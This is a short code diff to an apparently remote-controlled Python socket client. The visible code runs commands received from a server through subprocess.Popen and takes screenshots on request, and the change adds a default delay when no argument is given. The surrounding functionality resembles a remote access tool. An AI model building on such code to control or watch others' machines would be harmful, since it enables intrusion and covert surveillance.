@@ -111,7 +111,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     subprocess.Popen(command[1].decode())
                     data_to_send = b"Executed successfully"
                 elif command_type == Protocol.COMMAND_TAKE_SCREENSHOT:
-                    sec = int(command[2])
+                    if len(command) >= 3:
+                        sec = int(command[2])
+                    else:
+                        sec = 0.1
                     file_name = command[1].decode()
                     if os.path.splitext(file_name)[-1] != ".jpg": file_name+=".jpg"
                     sleep(sec)
